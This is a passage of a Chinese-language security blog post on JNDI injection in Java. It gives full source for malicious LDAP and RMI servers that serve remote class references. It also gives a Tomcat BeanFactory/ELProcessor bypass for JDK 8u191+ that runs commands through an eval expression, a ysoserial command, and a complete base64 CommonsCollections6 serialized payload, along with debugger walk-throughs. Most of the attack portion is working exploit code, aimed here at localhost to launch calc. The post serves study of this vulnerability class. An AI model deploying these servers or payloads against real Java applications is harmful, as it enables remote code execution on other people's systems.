result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 发送查询结果（这里发送一个 LDAP 引用指向恶意的 URL）</span><br>                sendResult(result, base, entry);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                System.err.println(<span class="hljs-string">&quot;Failed to send search result: &quot;</span> + e.getMessage());<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//返回一个 LDAP 引用</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result, String base, Entry entry)</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br><br>            <span class="hljs-comment">// 设置条目的属性，模拟一个恶意的 JNDI 引用</span><br>            entry.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> (refPos &gt; <span class="hljs-number">0</span>) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            <span class="hljs-comment">//恶意Ref类地址</span><br>            entry.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            <span class="hljs-comment">//javaNamingReference是协议层面约定的东西，照着这样写就行</span><br>            entry.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            entry.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            <br>            <span class="hljs-comment">// 发送查询结果，返回这个 LDAP 引用条目</span><br>            result.sendSearchEntry(entry);<br>            <span class="hljs-comment">// 设置查询结果为成功</span><br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>远程恶意class文件</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250123171554164.png" alt="image-20250123171554164"></p>
<p>客户端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiLdapClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) initialContext.lookup(<span class="hljs-string">&quot;ldap://localhost:1234/TestRef&quot;</span>);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>利用成果</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250208104039847.png" alt="image-20250208104039847"></p>
<p>一样的在客户端lookup方法打断点，路上很多简单赋值我们不看，一路直接跟<code>lookup</code>方法最后调用到<code>c_lookup</code>方法中，在这个方法底下会去调用<code>decodeObject</code>方法将我们传入的ldap对象</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250209140530244.png" alt="image-20250209140530244"></p>
<p>跟进<code>decodeObject</code>方法 ，发现会根据<code>LDAP</code>查询的结果来进行不同方法的调用，因为<code>LDAP</code>中会有能够存储很多值比如序列化，引用类 等 ，而我们传入的肯定是引用类于是就走到了引用类的判断方法中</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250209140556219.png" alt="image-20250209140556219"></p>
<p>这个方法其实大致了解下即可，就是个去解析我们的<code>Reference</code>引用对象的</p>
<p>我们直接看将返回的接口做了什么即可，最后在<code>\rt.jar!\com\sun\jndi\ldap\LdapCtx.java</code>将返回结果传入了<code>DirectoryManager.getObjectInstance</code>这个方法</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250209140720484.png" alt="image-20250209140720484"></p>
<p>根据refinfo去找那个引用对象，后面代码就是跟RMI一模一样了都是去本地找类找不到用<code>URLClassLoader</code>去远程加载类了</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250209140933486.png" alt="image-20250209140933486"></p>
<hr>
<h1 id="绕过高版本JDK（8u191-）限制"><a href="#绕过高版本JDK（8u191-）限制" class="headerlink" title="绕过高版本JDK（8u191+）限制"></a>绕过高版本JDK（8u191+）限制</h1><p>8u191之后，利用codebase加载ref的方法就失效了，trustURLcodebase默认为false</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250209213922326.png" alt="image-20250209213922326"></p>
<p>根据这个我们发现，代码修复的是远程加载，但是本地加载并没有什么限制</p>
<p>所以现在公开常用的方法是：</p>
<ol>
<li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令</li>
<li>LDAP可以存储对象的信息，利用LDAP返回一个恶意的序列化对象，JNDI中依然会对该对象进行反序列化操作，利用反序列化Gadget完成攻击</li>
</ol>
<p>当然这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。</p>
<h2 id="利用本地恶意Class作为Reference-Factory"><a href="#利用本地恶意Class作为Reference-Factory" class="headerlink" title="利用本地恶意Class作为Reference Factory"></a>利用本地恶意Class作为Reference Factory</h2><p>这里我使用的JDK版本为JDK231，同时需要加上这两个依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.71<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.glassfish<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.el<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>接着上面的代码调试，我们发现获取到ref后会调用getObjectFactoryFromReference()方法处理，factory不为空会调用getObjectInstance()方法</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250210163008580.png" alt="image-20250210163008580"></p>
<p>getObjectFactoryFromReference()这段代码的作用是查找并实例化我们引用对象的工厂，返回的是一个ObjectFactory</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250210163027548.png" alt="image-20250210163027548"></p>
<p>那么现在思路就有了，如果我们去找的是本地的工厂类，并且这此类实现了<code>ObjectFactory</code>接口并且他还有<code>getObjectInstance</code>方法，而<code>getObjectInstance</code>这个方法还有危险的操作，那么就可以进行一个利用了。</p>
<p>反正最终的结果肯定是找到了</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250211122910110.png" alt="image-20250211122910110"></p>
<p>通过观察这类我们发现，该类的<code>getObjectInstance()</code>函数中通过反射的方式实例化Reference所指向的任意Bean Class，这个Bean Class的类名、属性、属性值，全都来自于<code>Reference</code>对象，是可控的，并且会对所有的Setter方法反射调用赋值。</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250211124951170.png" alt="image-20250211124951170"></p>
<p>Server</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BypassJndiRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span><br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// 强制将&#x27;x&#x27;属性的setter从&#x27;setX&#x27;变为&#x27;eval&#x27;, 详细逻辑见BeanFactory.getObjectInstance代码</span><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        <span class="hljs-comment">// 利用表达式执行命令</span><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;, &#x27;/c&#x27;, &#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.sun.jndi.rmi.registry.ReferenceWrapper(ref);<br>        registry.bind(<span class="hljs-string">&quot;Object&quot;</span>, referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Client</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(<span class="hljs-string">&quot;rmi://localhost:1099/Object&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="利用LDAP返回序列化数据，触发本地Gadget"><a href="#利用LDAP返回序列化数据，触发本地Gadget" class="headerlink" title="利用LDAP返回序列化数据，触发本地Gadget"></a>利用LDAP返回序列化数据，触发本地Gadget</h2><p>LDAP 服务端除了支持 JNDI Reference 这种利用方式外，还支持直接返回一个序列化的对象。如果 Java 对象的 javaSerializedData 属性值不为空，则客户端的 <code>obj.decodeObject()</code> 方法就会对这个字段的内容进行反序列化。此时，如果服务端 ClassPath 中存在反序列化咯多功能利用 Gadget 如 CommonsCollections 库，那么就可以结合该 Gadget 实现反序列化漏洞攻击。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>使用ysoserial生成序列化字符串</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">java -jar ysoserial-all.jar CommonsCollections6 &#x27;calc&#x27; | base64<br></code></pre></td></tr></table></figure>
<p>创建一个恶意的LDAP服务器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8888/#TestRef&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">DEFAULT_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-number">6666</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> DEFAULT_URL;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> DEFAULT_PORT;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> createDirectoryServerConfig(LDAP_BASE, port);<br>            <span class="hljs-comment">// 为目录服务器添加操作拦截器，拦截 LDAP 操作并返回恶意的 RCE 引用</span><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-comment">// 创建一个目录服务器实例</span><br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;Failed to start LDAP server: &quot;</span> + e.getMessage());<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 创建目录服务器配置的方法</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> InMemoryDirectoryServerConfig <span class="hljs-title function_">createDirectoryServerConfig</span><span class="hljs-params">(String ldapBase, <span class="hljs-type">int</span> port)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(ldapBase);<br>        config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()<br>        ));<br>        <span class="hljs-keyword">return</span> config;<br>    &#125;<br><br>    <span class="hljs-comment">// 自定义操作拦截器类，用于拦截 LDAP 操作并返回恶意的 RCE 引用</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> URL codebase;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span><span class="hljs-params">(URL cb)</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br>        <span class="hljs-comment">// 处理搜索请求（当有搜索请求时调用此方法）</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result)</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 发送查询结果（这里发送一个 LDAP 引用指向恶意的 URL）</span><br>                sendResult(result, base, entry);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                System.err.println(<span class="hljs-string">&quot;Failed to send search result: &quot;</span> + e.getMessage());<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//返回一个 LDAP 引用</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result, String base, Entry entry)</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br><br>            <span class="hljs-comment">// 设置条目的属性，模拟一个恶意的 JNDI 引用</span><br>            entry.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-comment">//添加javaSerializedData属性，添加恶意的序列化数据</span><br>       		     						    entry.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>,Base64.getDecoder().decode(<span class="hljs-string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));<br><br>            <span class="hljs-comment">// 发送查询结果，返回这个 LDAP 引用条目</span><br>            result.sendSearchEntry(entry);<br>            <span class="hljs-comment">// 设置查询结果为成功</span><br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>Client</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  NamingException &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(<span class="hljs-string">&quot;ldap://localhost:6666/Object&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>同样的先从url加载对象</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250211140916188.png" alt="image-20250211140916188"></p>
<p>这里肯定为false</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250211140959115.png" alt="image-20250211140959115"></p>
<p>随后会走到反序列化的逻辑</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250211141149250.png" alt="image-20250211141149250"></p>
<p>最终导致反序列化攻击。</p>
<h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>浅蓝师傅又总结了一些特殊情况下的利用方法<a href="https://tttang.com/archive/1405">探索高版本 JDK 下 JNDI 漏洞的利用方法</a>，写的很清楚，这里就不展开了。</p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#0x03-%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%EF%BC%888u191-%EF%BC%89%E9%99%90%E5%88%B6">浅析JNDI注入</a></p>
<p><a href="https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-1">浅析高低版JDK下的JNDI注入及绕过</a></p>
<p><a href="https://goodapple.top/archives/696">Java安全学习——JNDI注入</a></p>
<p><a href="https://tttang.com/archive/1611/">JNDI注入分析</a></p>
<p><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8-LDAP-%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0-Gadg">Java反序列化之JNDI学习</a></p>
<p><a href="https://docs.oracle.com/javase/tutorial/jndi/overview/index.html">JAVA Documentation</a></p>
